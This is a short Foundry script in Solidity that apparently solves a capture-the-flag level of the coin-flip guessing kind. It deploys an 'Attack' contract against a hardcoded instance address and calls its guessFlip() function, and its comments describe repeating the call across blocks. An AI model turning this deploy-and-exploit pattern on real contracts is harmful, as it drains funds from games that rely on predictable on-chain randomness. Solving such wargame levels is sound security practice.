// SPDX-License-Identifier: MIT

// @notice: 1.We will just run this script once at first
// @notice: 2.Then we will get the address of the `Attack` contract
// @notice: 3.We will use the address of the attack contract to call the `guessFlip()` function in `FunctionCall.s.sol` script for 9 more times
// @notice: It is not possible to do all the work at once because all the transactions goes to the same block and it fails,
// so we have to do it manually.
pragma solidity 0.8.24;

import {Script,console2} from "forge-std/Script.sol";
import "../src/Attack.sol";

contract Solve is Script {

    Attack public attack;
    address public instance = 0x1dba3eDAcc5775BF5a0b13B9aC23c6f72431E8BA;
    function run() external {
        vm.startBroadcast();

        attack = new Attack(instance);
        console2.log("attack address for further use: ", address(attack));
        attack.guessFlip();

        vm.stopBroadcast();
    }
}